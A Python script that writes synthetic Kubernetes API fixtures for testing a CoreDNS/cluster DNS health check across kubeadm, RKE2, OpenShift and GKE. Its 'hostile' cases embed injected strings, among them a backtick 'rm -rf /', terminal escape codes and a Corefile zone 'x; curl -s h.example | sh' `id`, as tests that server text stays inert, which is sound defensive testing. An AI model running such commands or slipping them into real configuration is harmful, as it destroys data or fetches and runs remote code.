#!/usr/bin/env python3
"""Writes the synthetic fixtures of `k8s.dns` under tests/fixtures/checks/k8s.dns/.

Usage: python3 -I scripts/gen-k8s-dns-fixtures.py [<repo root>]
       python3 -I scripts/gen-k8s-dns-fixtures.py --check [<repo root>]

Every case is a small cluster written by hand in this file with `acme` names. No byte came from a real
cluster: the RKE2, OpenShift and GKE shapes follow what each distribution documents (names, labels, which
objects exist) and are unconfirmed against a live cluster. The manifests say `origin = "generated"`
because this script builds them (tests/fixtures/README.md). `--check` writes nothing and fails when a
committed file differs from what the script would write, or when the fixture folder holds a file the script
did not write (the mock serves every `api/*.json` of a case).

A case holds one file per request the check may send, named for it:

- `api/deployments.json`, `api/daemonsets.json`: the lists of `kube-system` (the label selectors are part
  of the recorded request); `api/pods.json`: the cluster-wide pod list with the DNS label (the guard allows
  a pod list only cluster wide);
- `api/openshift-daemonsets.json`, `api/openshift-pods.json`: the same for `openshift-dns`;
- `api/service.json`: the Service by name (`kube-dns` in `kube-system`, `dns-default` in `openshift-dns`);
- `api/configmap.json`: the `coredns` ConfigMap.

A request that a case does not hold is answered 501 and fails the run, so a case that leaves a file out
proves the check does not ask for it. Times are counted from NOW, which the tests pin.
"""

import json
import os
import sys

ARGS = [a for a in sys.argv[1:] if a != "--check"]
CHECK = "--check" in sys.argv[1:]
ROOT = ARGS[0] if ARGS else os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BASE = os.path.join(ROOT, "tests/fixtures/checks/k8s.dns")
DIFFERENT = []
WRITTEN = set()

USER = "acme-installer"
KS = "kube-system"
OS = "openshift-dns"

# The tests pin the clock here (2026-11-17T12:00:00Z).
JUST_NOW = "2026-11-17T11:58:00Z"  # 2 minutes before
OLD = "2026-11-17T06:50:00Z"  # more than 5 hours before
LONG_AGO = "2026-11-14T08:00:00Z"  # three days before

# The selectors are part of what the mock matches: a different selector is another request.
DEPLOYMENTS_QUERY = "labelSelector=k8s-app=kube-dns&limit=500"
DAEMONSETS_QUERY = "labelSelector=k8s-app in (kube-dns,node-local-dns)&limit=500"
PODS_QUERY = "fieldSelector=status.phase!=Succeeded,status.phase!=Failed&labelSelector=k8s-app=kube-dns&limit=500"
OS_DAEMONSETS_QUERY = "labelSelector=dns.operator.openshift.io/owning-dns=default&limit=500"
OS_PODS_QUERY = "fieldSelector=status.phase!=Succeeded,status.phase!=Failed&labelSelector=dns.operator.openshift.io/daemonset-dns=default&limit=500"

# What a projection must drop: `kubectl apply` stores the whole applied object in this annotation.
LAST_APPLIED = {
    "kubectl.kubernetes.io/last-applied-configuration": '{"env":[{"name":"ACME_TOKEN","value":"ENV-VALUE-MUST-NOT-APPEAR"}],"data":{"extra.override":"KEY-MUST-NOT-APPEAR"}}'
}
RKE2_SERVICE = "rke2-coredns-rke2-coredns"
OS_NAME_QUERY = "fieldSelector=metadata.name=dns-default&limit=500"

HOSTILE_NAME = "dns\u001b[2J`rm -rf /`‮" + "x" * 80


def write(case, name, value, text=False):
    path = os.path.join(BASE, case, name)
    WRITTEN.add(os.path.normpath(path))
    data = value if text else json.dumps(value, indent=2) + "\n"
    if CHECK:
        try:
            with open(path, newline="") as f:
                same = f.read() == data
        except FileNotFoundError:
            same = False
        if not same:
            DIFFERENT.append(path)
        return
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", newline="\n") as f:
        f.write(data)


def case(name, summary):
    write(
        name,
        "fixture.toml",
        f'''schema = 1
name = "k8s-dns-{name}"
summary = "{summary}"
origin = "generated"
os = "linux"
arch = "x86_64"
answers = ["k8s.dns"]

[caps]
root = false
network = true
kube = true
''',
        text=True,
    )


def status(code, reason, message):
    return {
        "kind": "Status",
        "apiVersion": "v1",
        "metadata": {},
        "status": "Failure",
        "message": message,
        "reason": reason,
        "details": {},
        "code": code,
    }


def forbidden(what, group, ns):
    where = f'in the namespace "{ns}"' if ns else "at the cluster scope"
    return status(
        403,
        "Forbidden",
        f'{what} is forbidden: User "{USER}" cannot list resource "{what}" in API group "{group}" {where}',
    )


def put(case_name, file, path, query, code, body):
    request = {"method": "GET", "path": path}
    if query:
        request["query"] = query
    write(case_name, f"api/{file}.json", {"request": request, "status": code, "body": body})


def listing(api, kind, items, more=False):
    meta = {"resourceVersion": "1000"}
    if more:
        meta["continue"] = "page-2"
    return {"apiVersion": api, "kind": kind + "List", "metadata": meta, "items": items}


# ---- the objects ---------------------------------------------------------------------------------------------


def template(containers, labels=None):
    return {
        "metadata": {"labels": labels or {"k8s-app": "kube-dns"}},
        "spec": {
            "containers": [
                {
                    "name": c,
                    "image": f"registry.acme.example/dns/{c}:1.0",
                    # What a projection must drop: an env value that looks like a credential.
                    "env": [{"name": "ACME_TOKEN", "value": "ENV-VALUE-MUST-NOT-APPEAR"}],
                    "args": ["-conf", "/etc/coredns/Corefile"],
                }
                for c in containers
            ]
        },
    }


def deployment(name, labels, containers, replicas, ready, ns=KS):
    spec = {"selector": {"matchLabels": labels}, "template": template(containers)}
    if replicas is not None:
        spec["replicas"] = replicas
    status_ = {"replicas": replicas or 1}
    if ready is not None:
        status_["readyReplicas"] = ready
    return {
        "apiVersion": "apps/v1",
        "kind": "Deployment",
        "metadata": {"name": name, "namespace": ns, "labels": labels, "annotations": LAST_APPLIED},
        "spec": spec,
        "status": status_,
    }


def daemonset(name, labels, containers, desired, ready, ns=KS, selector=None):
    """`selector` is the pod label set of the selector and the template, when it is not `labels`."""
    pod_labels = selector or labels
    return {
        "apiVersion": "apps/v1",
        "kind": "DaemonSet",
        "metadata": {"name": name, "namespace": ns, "labels": labels, "annotations": LAST_APPLIED},
        "spec": {"selector": {"matchLabels": pod_labels}, "template": template(containers, pod_labels)},
        "status": {
            "currentNumberScheduled": desired,
            "desiredNumberScheduled": desired,
            "numberMisscheduled": 0,
            "numberReady": ready,
        },
    }


def running(name, restarts=0, last_finished=None, last_reason="Error"):
    """A ready pod. With `last_finished` it has an older run that ended then."""
    status_ = {
        "name": "coredns",
        "ready": True,
        "restartCount": restarts,
        "state": {"running": {"startedAt": "2026-11-14T08:01:00Z"}},
    }
    if last_finished:
        status_["lastState"] = {
            "terminated": {"exitCode": 1, "reason": last_reason, "finishedAt": last_finished}
        }
    return pod(name, status_)


def crashing(name, finished=JUST_NOW, reason="Error", exit_code=1, restarts=9, container="coredns"):
    return pod(
        name,
        {
            "name": container,
            "ready": False,
            "restartCount": restarts,
            "state": {"waiting": {"reason": "CrashLoopBackOff", "message": "back-off 5m0s restarting failed container"}},
            "lastState": {
                "terminated": {"exitCode": exit_code, "reason": reason, "finishedAt": finished}
            },
        },
    )


def pod(name, container_status, ns=KS, labels=None):
    return {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {
            "name": name,
            "namespace": ns,
            "labels": labels or {"k8s-app": "kube-dns"},
            "annotations": LAST_APPLIED,
        },
        # What a projection must drop: the spec of the pod, with an env value.
        "spec": {
            "containers": [
                {"name": "coredns", "env": [{"name": "ACME_TOKEN", "value": "ENV-VALUE-MUST-NOT-APPEAR"}]}
            ]
        },
        "status": {"phase": "Running", "containerStatuses": [container_status]},
    }


DNS_PORTS = [(53, "UDP"), (53, "TCP"), (9153, "TCP")]


def service(name="kube-dns", ns=KS, cluster_ip="10.96.0.10", ports=None, selector=None):
    spec = {
        "type": "ClusterIP",
        "selector": selector or {"k8s-app": "kube-dns"},
        "ports": [
            {"name": f"{proto.lower()}-{port}", "port": port, "protocol": proto}
            for port, proto in (DNS_PORTS if ports is None else ports)
        ],
    }
    if cluster_ip is not None:
        spec["clusterIP"] = cluster_ip
        spec["clusterIPs"] = [cluster_ip]
    return {
        "apiVersion": "v1",
        "kind": "Service",
        "metadata": {"name": name, "namespace": ns, "annotations": LAST_APPLIED},
        "spec": spec,
    }


KUBEADM_COREFILE = """.:53 {
    errors
    health {
       lameduck 5s
    }
    ready
    kubernetes cluster.local in-addr.arpa ip6.arpa {
       pods insecure
       fallthrough in-addr.arpa ip6.arpa
       ttl 30
    }
    prometheus :9153
    forward . /etc/resolv.conf {
       max_concurrent 1000
    }
    cache 30
    loop
    reload
    loadbalance
}
"""


def corefile(text, other_keys=True):
    data = {"Corefile": text}
    if other_keys:
        # What the projection must drop.
        data["extra.override"] = "key = KEY-MUST-NOT-APPEAR"
    return {
        "apiVersion": "v1",
        "kind": "ConfigMap",
        "metadata": {"name": "coredns", "namespace": KS, "annotations": LAST_APPLIED},
        "data": data,
    }


# ---- the requests, one writer each ---------------------------------------------------------------------------


def deployments(c, items=(), code=200, more=False):
    body = listing("apps/v1", "Deployment", list(items), more) if code == 200 else forbidden("deployments.apps", "apps", KS)
    put(c, "deployments", f"/apis/apps/v1/namespaces/{KS}/deployments", DEPLOYMENTS_QUERY, code, body)


def daemonsets(c, items=(), code=200):
    body = listing("apps/v1", "DaemonSet", list(items)) if code == 200 else forbidden("daemonsets.apps", "apps", KS)
    put(c, "daemonsets", f"/apis/apps/v1/namespaces/{KS}/daemonsets", DAEMONSETS_QUERY, code, body)


def pods(c, items=(), code=200):
    body = listing("v1", "Pod", list(items)) if code == 200 else forbidden("pods", "", None)
    put(c, "pods", "/api/v1/pods", PODS_QUERY, code, body)


def os_daemonsets(c, items=(), code=200, by_name=None):
    """The label list of `openshift-dns`. When it is empty and readable the check asks again by the name
    `dns-default`, so a case with an empty list also holds that answer (`by_name`, empty by default)."""
    body = listing("apps/v1", "DaemonSet", list(items)) if code == 200 else forbidden("daemonsets.apps", "apps", OS)
    put(c, "openshift-daemonsets", f"/apis/apps/v1/namespaces/{OS}/daemonsets", OS_DAEMONSETS_QUERY, code, body)
    if code == 200 and not items:
        named = listing("apps/v1", "DaemonSet", list(by_name or []))
        put(c, "openshift-daemonsets-by-name", f"/apis/apps/v1/namespaces/{OS}/daemonsets", OS_NAME_QUERY, 200, named)


def os_pods(c, items=(), code=200):
    body = listing("v1", "Pod", list(items)) if code == 200 else forbidden("pods", "", None)
    put(c, "openshift-pods", "/api/v1/pods", OS_PODS_QUERY, code, body)


def svc(c, obj=None, ns=KS, name="kube-dns", code=200, file="service"):
    if code == 200:
        body = obj
    elif code == 404:
        body = status(404, "NotFound", f'services "{name}" not found')
        body["details"] = {"name": name, "kind": "services"}
    else:
        body = status(
            403,
            "Forbidden",
            f'services "{name}" is forbidden: User "{USER}" cannot get resource "services" in API group "" in the namespace "{ns}"',
        )
    put(c, file, f"/api/v1/namespaces/{ns}/services/{name}", None, code, body)


def cm(c, obj=None, code=200):
    if code == 200:
        body = obj
    elif code == 404:
        body = status(404, "NotFound", 'configmaps "coredns" not found')
        body["details"] = {"name": "coredns", "kind": "configmaps"}
    else:
        body = status(
            403,
            "Forbidden",
            f'configmaps "coredns" is forbidden: User "{USER}" cannot get resource "configmaps" in API group "" in the namespace "{KS}"',
        )
    put(c, "configmap", f"/api/v1/namespaces/{KS}/configmaps/coredns", None, code, body)


KUBE_DNS = {"k8s-app": "kube-dns"}


def kubeadm(c, pod_items, ready=2, replicas=2, corefile_text=KUBEADM_COREFILE):
    """CoreDNS of a kubeadm cluster: a Deployment `coredns`, the Service and the ConfigMap."""
    deployments(c, [deployment("coredns", KUBE_DNS, ["coredns"], replicas, ready)])
    daemonsets(c)
    pods(c, pod_items)
    svc(c, service())
    cm(c, corefile(corefile_text))


# ---- CoreDNS in kube-system ---------------------------------------------------------------------------------

case("kubeadm-ok", "CoreDNS 2 of 2, a Service with a ClusterIP, and a pod with 14 old restarts")
kubeadm(
    "kubeadm-ok",
    [
        running("coredns-aaa", restarts=14, last_finished=LONG_AGO),
        running("coredns-bbb"),
    ],
)

case("kubeadm-restarts-recent-but-running", "A ready pod whose last run ended 5 minutes ago and is Running again")
kubeadm(
    "kubeadm-restarts-recent-but-running",
    [running("coredns-aaa", restarts=3, last_finished="2026-11-17T11:55:00Z"), running("coredns-bbb")],
)

case("loop-crashloop", "One of two CoreDNS pods crash-loops (last run ended 2 minutes ago) and the Corefile forwards to /etc/resolv.conf")
kubeadm("loop-crashloop", [crashing("coredns-aaa"), running("coredns-bbb")], ready=1)

case("loop-without-loop-plugin", "A recent crash loop and forward /etc/resolv.conf, in a Corefile with no loop plugin")
kubeadm(
    "loop-without-loop-plugin",
    [crashing("coredns-aaa"), running("coredns-bbb")],
    ready=1,
    corefile_text=".:53 {\n    kubernetes cluster.local in-addr.arpa ip6.arpa\n    forward . /etc/resolv.conf\n}\n",
)

case("crashloop-explicit-upstream", "A crash-looping CoreDNS whose Corefile forwards to explicit upstreams")
kubeadm(
    "crashloop-explicit-upstream",
    [crashing("coredns-aaa"), running("coredns-bbb")],
    ready=1,
    corefile_text=".:53 {\n    kubernetes cluster.local in-addr.arpa ip6.arpa\n    forward . 10.0.0.2 10.0.0.3\n    loop\n}\n",
)

case("crashloop-old", "A crash-looping CoreDNS pod whose last run ended 5 hours ago, with forward /etc/resolv.conf")
kubeadm("crashloop-old", [crashing("coredns-aaa", finished=OLD), running("coredns-bbb")], ready=1)

case("crashloop-no-finish-time", "A crash-looping CoreDNS pod with no termination time, with forward /etc/resolv.conf")
no_time = crashing("coredns-aaa")
del no_time["status"]["containerStatuses"][0]["lastState"]
kubeadm("crashloop-no-finish-time", [no_time, running("coredns-bbb")], ready=1)

case("crashloop-skew", "A crash-looping CoreDNS pod whose last run ends two hours after the clock, with forward /etc/resolv.conf")
kubeadm("crashloop-skew", [crashing("coredns-aaa", finished="2026-11-17T14:00:00Z"), running("coredns-bbb")], ready=1)

case("crashloop-oom", "A CoreDNS pod OOMKilled 2 minutes ago, with forward /etc/resolv.conf")
kubeadm(
    "crashloop-oom",
    [crashing("coredns-aaa", reason="OOMKilled", exit_code=137), running("coredns-bbb")],
    ready=1,
)

case("loop-corefile-forbidden", "A recent crash loop, and the identity may not get the coredns ConfigMap")
deployments("loop-corefile-forbidden", [deployment("coredns", KUBE_DNS, ["coredns"], 2, 1)])
daemonsets("loop-corefile-forbidden")
pods("loop-corefile-forbidden", [crashing("coredns-aaa"), running("coredns-bbb")])
svc("loop-corefile-forbidden", service())
cm("loop-corefile-forbidden", code=403)

case("healthy-corefile-forbidden", "CoreDNS is healthy and the identity may not get the coredns ConfigMap")
deployments("healthy-corefile-forbidden", [deployment("coredns", KUBE_DNS, ["coredns"], 2, 2)])
daemonsets("healthy-corefile-forbidden")
pods("healthy-corefile-forbidden", [running("coredns-aaa"), running("coredns-bbb")])
svc("healthy-corefile-forbidden", service())
cm("healthy-corefile-forbidden", code=403)

case("not-ready", "CoreDNS has 0 of 2 pods ready")
kubeadm("not-ready", [running("coredns-aaa")], ready=None)

case("scaled-to-zero", "CoreDNS is scaled to 0 replicas")
kubeadm("scaled-to-zero", [], ready=None, replicas=0)

case("default-replicas", "A Deployment with no replicas field (the server's default is 1) and one ready pod")
kubeadm("default-replicas", [running("coredns-aaa")], ready=1, replicas=None)

case("domain-other", "The Corefile serves the cluster domain corp.internal")
kubeadm(
    "domain-other",
    [running("coredns-aaa"), running("coredns-bbb")],
    corefile_text=".:53 {\n    kubernetes corp.internal in-addr.arpa ip6.arpa\n    forward . /run/systemd/resolve/resolv.conf\n}\n",
)

case("corefile-no-zone", "A Corefile with no kubernetes plugin line")
kubeadm(
    "corefile-no-zone",
    [running("coredns-aaa"), running("coredns-bbb")],
    corefile_text=".:53 {\n    forward . 10.0.0.2\n}\n",
)

case("corefile-no-key", "The coredns ConfigMap has no Corefile key")
deployments("corefile-no-key", [deployment("coredns", KUBE_DNS, ["coredns"], 2, 2)])
daemonsets("corefile-no-key")
pods("corefile-no-key", [running("coredns-aaa"), running("coredns-bbb")])
svc("corefile-no-key", service())
cm(
    "corefile-no-key",
    {
        "apiVersion": "v1",
        "kind": "ConfigMap",
        "metadata": {"name": "coredns", "namespace": KS},
        "data": {"other": "x"},
    },
)

case("nodelocal", "CoreDNS plus the NodeLocal DNSCache daemon set on 2 of 3 nodes")
deployments("nodelocal", [deployment("coredns", KUBE_DNS, ["coredns"], 2, 2)])
daemonsets(
    "nodelocal",
    [daemonset("node-local-dns", {"k8s-app": "node-local-dns"}, ["node-cache"], 3, 2)],
)
pods("nodelocal", [running("coredns-aaa"), running("coredns-bbb")])
svc("nodelocal", service())
cm("nodelocal", corefile(KUBEADM_COREFILE))

case("label-noise", "The server returns a workload that is not cluster DNS next to CoreDNS")
deployments(
    "label-noise",
    [
        deployment("kube-dns-autoscaler", {"k8s-app": "kube-dns-autoscaler"}, ["autoscaler"], 1, 0),
        deployment("coredns", KUBE_DNS, ["coredns"], 2, 2),
    ],
)
daemonsets("label-noise")
pods("label-noise", [running("coredns-aaa"), running("coredns-bbb")])
svc("label-noise", service())
cm("label-noise", corefile(KUBEADM_COREFILE))

# ---- the Service ---------------------------------------------------------------------------------------------

case("service-headless", "CoreDNS is ready and the Service is headless")
deployments("service-headless", [deployment("coredns", KUBE_DNS, ["coredns"], 2, 2)])
daemonsets("service-headless")
pods("service-headless", [running("coredns-aaa"), running("coredns-bbb")])
svc("service-headless", service(cluster_ip="None"))
cm("service-headless", corefile(KUBEADM_COREFILE))

case("service-missing", "CoreDNS is ready and there is no Service kube-dns")
deployments("service-missing", [deployment("coredns", KUBE_DNS, ["coredns"], 2, 2)])
daemonsets("service-missing")
pods("service-missing", [running("coredns-aaa"), running("coredns-bbb")])
svc("service-missing", code=404)
cm("service-missing", corefile(KUBEADM_COREFILE))

case("service-forbidden", "CoreDNS is ready and the identity may not get the Service")
deployments("service-forbidden", [deployment("coredns", KUBE_DNS, ["coredns"], 2, 2)])
daemonsets("service-forbidden")
pods("service-forbidden", [running("coredns-aaa"), running("coredns-bbb")])
svc("service-forbidden", code=403)
cm("service-forbidden", corefile(KUBEADM_COREFILE))

case("service-no-port", "The Service has a ClusterIP and no port 53")
deployments("service-no-port", [deployment("coredns", KUBE_DNS, ["coredns"], 2, 2)])
daemonsets("service-no-port")
pods("service-no-port", [running("coredns-aaa"), running("coredns-bbb")])
svc("service-no-port", service(ports=[(9153, "TCP")]))
cm("service-no-port", corefile(KUBEADM_COREFILE))

# ---- nothing, or nothing readable ----------------------------------------------------------------------------

case("service-no-tcp", "The Service has a ClusterIP and UDP port 53 only")
deployments("service-no-tcp", [deployment("coredns", KUBE_DNS, ["coredns"], 2, 2)])
daemonsets("service-no-tcp")
pods("service-no-tcp", [running("coredns-aaa"), running("coredns-bbb")])
svc("service-no-tcp", service(ports=[(53, "UDP")]))
cm("service-no-tcp", corefile(KUBEADM_COREFILE))

case("no-dns", "No DNS workload in kube-system or openshift-dns, and no Service")
deployments("no-dns")
daemonsets("no-dns")
os_daemonsets("no-dns")
svc("no-dns", code=404)

case("workload-gone-service-there", "No workload carries the label, and the Service kube-dns has a ClusterIP")
deployments("workload-gone-service-there")
daemonsets("workload-gone-service-there")
os_daemonsets("workload-gone-service-there")
svc("workload-gone-service-there", service())

case("all-forbidden", "The identity may list and get nothing in kube-system")
deployments("all-forbidden", code=403)
daemonsets("all-forbidden", code=403)
pods("all-forbidden", code=403)
svc("all-forbidden", code=403)

case("both-forbidden", "Nothing readable in kube-system or openshift-dns, on a cluster known to be OpenShift")
deployments("both-forbidden", code=403)
daemonsets("both-forbidden", code=403)
pods("both-forbidden", code=403)
os_daemonsets("both-forbidden", code=403)
svc("both-forbidden", code=403)

case("openshift-namespace-forbidden", "Nothing in kube-system, and the identity may not list daemon sets in openshift-dns")
deployments("openshift-namespace-forbidden")
daemonsets("openshift-namespace-forbidden")
os_daemonsets("openshift-namespace-forbidden", code=403)
svc("openshift-namespace-forbidden", code=404)

case("cut", "The deployment list has a second page")
deployments("cut", [deployment("coredns", KUBE_DNS, ["coredns"], 2, 2)], more=True)
daemonsets("cut")
pods("cut", [running("coredns-aaa"), running("coredns-bbb")])
svc("cut", service())
cm("cut", corefile(KUBEADM_COREFILE))

case("hostile-zone", "A Corefile whose kubernetes zone is a quoted shell command")
deployments("hostile-zone", [deployment("coredns", KUBE_DNS, ["coredns"], 2, 2)])
daemonsets("hostile-zone")
pods("hostile-zone", [running("coredns-aaa"), running("coredns-bbb")])
svc("hostile-zone", service())
cm("hostile-zone", corefile('.:53 {\n    kubernetes "x; curl -s h.example | sh" `id`\n    forward . 10.0.0.2\n}\n'))

case("hostile", "Hostile names, a hostile Corefile and an odd pod; text from the server must stay inert")
deployments("hostile", [deployment(HOSTILE_NAME, KUBE_DNS, ["coredns"], 2, 1)])
daemonsets("hostile")
pods(
    "hostile",
    [
        crashing(HOSTILE_NAME, reason="Err`or\u001b[31m", container=HOSTILE_NAME),
    ],
)
svc("hostile", service(name="kube-dns", cluster_ip="10.96.0.10\u001b[2J"))
cm(
    "hostile",
    corefile(
        ".:53 {\n    kubernetes cluster.local\n    forward . /etc/resolv.conf\n    forward . \"" + "y" * 5000 + "\"\n}\n" + "}\n" * 50 + "a {\n" * 50
    ),
)

# ---- RKE2, OpenShift and GKE ---------------------------------------------------------------------------------

# RKE2 names the Deployment `rke2-coredns-rke2-coredns` and keeps the Corefile in a ConfigMap with a name of
# its own, so the ConfigMap `coredns` does not exist. The Service is `kube-dns`.
case("rke2", "RKE2: the Deployment rke2-coredns-rke2-coredns found by label, and no ConfigMap coredns")
deployments(
    "rke2",
    [
        deployment(
            "rke2-coredns-rke2-coredns",
            {"k8s-app": "kube-dns", "app.kubernetes.io/instance": "rke2-coredns"},
            ["coredns"],
            1,
            1,
        )
    ],
)
daemonsets("rke2")
pods("rke2", [running("rke2-coredns-rke2-coredns-7d9c5f6b5-x8k2z")])
svc("rke2", code=404)
svc("rke2", service(name=RKE2_SERVICE, cluster_ip="10.43.0.10"), name=RKE2_SERVICE, file="service-rke2")
cm("rke2", code=404)

case("rke2-no-service", "RKE2 workload found, and neither a Service kube-dns nor one named like the Deployment")
deployments("rke2-no-service", [deployment(RKE2_SERVICE, {"k8s-app": "kube-dns"}, ["coredns"], 1, 1)])
daemonsets("rke2-no-service")
pods("rke2-no-service", [running("rke2-coredns-rke2-coredns-7d9c5f6b5-x8k2z")])
svc("rke2-no-service", code=404)
svc("rke2-no-service", code=404, name=RKE2_SERVICE, file="service-rke2")
cm("rke2-no-service", code=404)

case("rke2-loop", "RKE2 with a crash-looping CoreDNS; the ConfigMap is named otherwise, so the loop cannot be told")
deployments(
    "rke2-loop",
    [deployment("rke2-coredns-rke2-coredns", {"k8s-app": "kube-dns"}, ["coredns"], 1, 0)],
)
daemonsets("rke2-loop")
pods("rke2-loop", [crashing("rke2-coredns-rke2-coredns-7d9c5f6b5-x8k2z", restarts=40)])
svc("rke2-loop", code=404)
svc("rke2-loop", service(name=RKE2_SERVICE, cluster_ip="10.43.0.10"), name=RKE2_SERVICE, file="service-rke2")
cm("rke2-loop", code=404)

OS_LABELS = {"dns.operator.openshift.io/owning-dns": "default"}
OS_POD_LABELS = {"dns.operator.openshift.io/daemonset-dns": "default"}


def openshift(c, ready=6, desired=6, pod_items=None, svc_obj=None, svc_code=200):
    """OpenShift: nothing under the kube-dns label, a `dns-default` DaemonSet in `openshift-dns`."""
    deployments(c)
    daemonsets(c)
    os_daemonsets(
        c,
        [
            daemonset("dns-default", OS_LABELS, ["dns", "kube-rbac-proxy"], desired, ready, ns=OS, selector=OS_POD_LABELS),
        ],
    )
    os_pods(
        c,
        pod_items
        if pod_items is not None
        else [pod(f"dns-default-{suffix}", {"name": "dns", "ready": True, "restartCount": 0, "state": {"running": {}}}, ns=OS, labels=OS_POD_LABELS) for suffix in ("x7k2p", "m4q9z")],
    )
    if svc_code == 200:
        svc(c, svc_obj or service(name="dns-default", ns=OS, cluster_ip="172.30.0.10", selector=OS_POD_LABELS), ns=OS, name="dns-default")
    else:
        svc(c, ns=OS, name="dns-default", code=svc_code)


case("openshift", "OpenShift: the dns-default daemon set in openshift-dns found by label, no kube-dns Service, no Corefile read")
openshift("openshift")

case("openshift-labels-drift", "OpenShift where the DNS labels changed: the daemon set is found by the name dns-default")
deployments("openshift-labels-drift")
daemonsets("openshift-labels-drift")
os_daemonsets(
    "openshift-labels-drift",
    [],
    by_name=[daemonset("dns-default", {"app": "dns"}, ["dns", "kube-rbac-proxy"], 6, 6, ns=OS)],
)
os_pods(
    "openshift-labels-drift",
    [pod("dns-default-x7k2p", {"name": "dns", "ready": True, "restartCount": 0, "state": {"running": {}}}, ns=OS, labels=OS_POD_LABELS)],
)
svc("openshift-labels-drift", service(name="dns-default", ns=OS, cluster_ip="172.30.0.10", selector=OS_POD_LABELS), ns=OS, name="dns-default")

case("openshift-partial", "OpenShift with 5 of 6 DNS pods ready")
openshift("openshift-partial", ready=5)

case("openshift-service-missing", "OpenShift with the daemon set and no dns-default Service")
openshift("openshift-service-missing", svc_code=404)

case("openshift-crashloop", "OpenShift with a crash-looping DNS pod: there is no Corefile that rdy reads")
openshift(
    "openshift-crashloop",
    ready=5,
    pod_items=[
        pod(
            "dns-default-x7k2p",
            {
                "name": "dns",
                "ready": False,
                "restartCount": 5,
                "state": {"waiting": {"reason": "CrashLoopBackOff"}},
                "lastState": {"terminated": {"exitCode": 1, "reason": "Error", "finishedAt": JUST_NOW}},
            },
            ns=OS,
            labels=OS_POD_LABELS,
        )
    ],
)

# GKE runs kube-dns (containers kubedns, dnsmasq, sidecar) under the same label, and has no Corefile.
case("gke", "GKE: the kube-dns Deployment found by label; no ConfigMap coredns is asked for")
deployments(
    "gke",
    [
        deployment("kube-dns", KUBE_DNS, ["kubedns", "dnsmasq", "sidecar", "prometheus-to-sd"], 2, 2),
        deployment("kube-dns-autoscaler", {"k8s-app": "kube-dns-autoscaler"}, ["autoscaler"], 1, 1),
    ],
)
daemonsets("gke")
pods("gke", [running("kube-dns-5bf4b6b7c-aaaaa"), running("kube-dns-5bf4b6b7c-bbbbb")])
svc("gke", service(cluster_ip="10.120.0.10"))

case("gke-crashloop", "GKE kube-dns with a crash-looping pod: no Corefile, so no loop verdict")
deployments("gke-crashloop", [deployment("kube-dns", KUBE_DNS, ["kubedns", "dnsmasq", "sidecar"], 2, 1)])
daemonsets("gke-crashloop")
pods("gke-crashloop", [crashing("kube-dns-5bf4b6b7c-aaaaa", container="kubedns"), running("kube-dns-5bf4b6b7c-bbbbb")])
svc("gke-crashloop", service(cluster_ip="10.120.0.10"))

# ---- the whole folder -----------------------------------------------------------------------------------------

if CHECK:
    for folder, _, names in os.walk(BASE):
        for found in names:
            path = os.path.normpath(os.path.join(folder, found))
            if path not in WRITTEN:
                DIFFERENT.append(path + " (the script does not write this file)")
    if DIFFERENT:
        sys.stderr.write("these fixtures differ from what the script writes:\n")
        for path in DIFFERENT:
            sys.stderr.write(f"  {path}\n")
        sys.stderr.write(
            "Fix: delete any file the script does not write, run python3 -I scripts/gen-k8s-dns-fixtures.py and commit the result.\n"
        )
        sys.exit(1)
